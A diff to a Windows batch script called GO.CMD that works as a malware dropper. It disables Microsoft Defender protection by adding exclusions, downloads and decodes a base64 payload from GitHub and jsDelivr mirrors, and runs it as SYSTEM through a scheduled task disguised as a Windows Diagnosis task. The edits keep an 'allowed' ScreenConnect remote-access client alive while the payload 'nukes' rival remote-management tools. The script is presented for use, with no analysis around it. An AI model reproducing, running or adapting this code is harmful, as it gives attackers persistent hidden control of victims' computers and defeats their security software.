@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU7U3 ===
+echo === GO.CMD BUILD 20260730WU7U4 ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,13 +13,20 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "MARKER=WU_BUILD_20260730_UNIFIED3"
+set "MARKER=WU_BUILD_20260730_UNIFIED4"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "RUNPS="
 set "CB=%RANDOM%%RANDOM%"
+set "ALTSC=ScreenConnect Client (f861c8140d453427)"
+set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
 
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1
+
+REM NEVER: taskkill /IM ScreenConnect.ClientService.exe — kills pluxn too
+echo Protecting allowed alt SC before payload...
+sc config "%ALTSC%" start= auto >nul 2>&1
+sc start "%ALTSC%" >nul 2>&1
 
 echo Cleaning previous payload hosts/scripts...
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue}Catch{}" >nul 2>&1
@@ -39,7 +46,8 @@ schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
 schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
 
 echo NOTE: rival RMM nuke runs ONLY after primary SC is RUNNING (inside payload).
-echo Downloading UNIFIED payload (cache-bust %CB%)...
+echo NOTE: allowed alt SC (pluxn) is NEVER killed by image name.
+echo Downloading UNIFIED4 payload (cache-bust %CB%)...
 call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" && goto :have_payload
 call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
 call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
@@ -49,6 +57,7 @@ powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{
 call :check_size && goto :have_payload
 
 echo Download failed on all mirrors.
+sc start "%ALTSC%" >nul 2>&1
 exit /b 1
 
 :have_payload
@@ -70,6 +79,7 @@ if not defined RUNPS (
 
 if not defined RUNPS (
   echo Decode failed.
+  sc start "%ALTSC%" >nul 2>&1
   exit /b 2
 )
 
@@ -79,6 +89,7 @@ for %%A in ("%RUNPS%") do echo Decoded bytes: %%~zA
 findstr /C:"%MARKER%" "%RUNPS%" >nul
 if errorlevel 1 (
   echo ERROR: decoded payload missing %MARKER%
+  sc start "%ALTSC%" >nul 2>&1
   exit /b 3
 )
 
@@ -88,6 +99,8 @@ set "WRAP=%WORKDIR%\boot.cmd"
 > "%WRAP%" echo @echo off
 >>"%WRAP%" echo echo boot_start^> "%ERR%"
 >>"%WRAP%" echo powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%RUNPS%" ^>^> "%ERR%" 2^>^&1
+>>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
+>>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^> "%ERR%"
 
 schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "\"%WRAP%\""
@@ -95,15 +108,18 @@ if errorlevel 1 (
   schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%RUNPS%\""
   if errorlevel 1 (
     echo ERROR: could not create SYSTEM task
+    sc start "%ALTSC%" >nul 2>&1
     exit /b 4
   )
 )
 schtasks /Run /TN "%ONCETASK%"
 echo Payload OK [%MARKER%], launched as SYSTEM.
-echo Order: clean old scripts -^> ensure primary SC -^> then nuke rivals.
+echo Order: protect alt -^> ensure primary SC -^> then nuke rivals (alt never killed).
+sc start "%ALTSC%" >nul 2>&1
 echo Wait 180s then check:
 echo   type "%WORKDIR%\.diag.log"
-echo   sc query "ScreenConnect Client (5f6010579852e507)"
+echo   sc query "%PRIMSC%"
+echo   sc query "%ALTSC%"
 echo   dir "%WORKDIR%\scclient\*.exe"
 exit /b 0
 
